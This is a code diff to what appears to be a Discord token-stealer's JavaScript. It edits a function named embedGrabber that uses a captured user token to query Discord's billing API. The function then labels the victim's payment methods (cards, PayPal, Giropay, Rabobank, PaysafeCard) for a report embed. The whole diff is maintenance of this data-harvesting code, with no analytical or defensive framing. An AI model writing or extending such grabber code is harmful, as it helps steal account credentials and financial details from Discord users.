@@ -72,12 +72,6 @@ const emojis = {
       "<:Booster18Month:1051453778127237180> ",
       "<:Booster24Month:1051453776889917530> ",
     ],
-    "payments": [
-      "<a:card:1083014677430284358> ",
-      "<:paypal:1129073151746252870> ",
-      "<:rabobank:1249413851275984906> ",
-      "<:paysafecard:1249413656769335336> ",
-    ],
     "i": [
       "<:staff:1090015968618623129> ",
       "<:partner:918207395279273985> ",
@@ -199,12 +193,13 @@ function embedGrabber(info, data) {
   const payment = getAPI(`https://discord.com/api/v9/users/@me/billing/payment-sources`, info.token);
 
   const billing = payment?.reduce((a, e) => {
-    if (e.brand && !e.invalid) a += emojis.user.payments[0];
-    if (e.email) a += emojis.user.payments[1];
-    if (e.type == 16) a += emojis.user.payments[2];
-    if (e.type == 7) a += emojis.user.payments[3];
+    if (e.email) a += `<:paypal:861207258846330880> `;
+    if (e.type == 1 && !e.invalid) a += `<:creditcart:741512388490035251> `;
+    if (e.type == 3 && !e.invalid) a += `\`Giropay\` `;
+    if (e.type == 16 && !e.invalid) a += `\`Rabobank\` `;
+    if (e.type == 7 && !e.invalid) a += `\`PaysafeCard\` `;
     return a;
-  }, '') || 'No Found';
+  }, '') ||  `\`No found\``;
 
   const avatar = info.avatar ? getImage(`https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`) : 'https://i.imgur.com/WkKXZSl.gif';
 
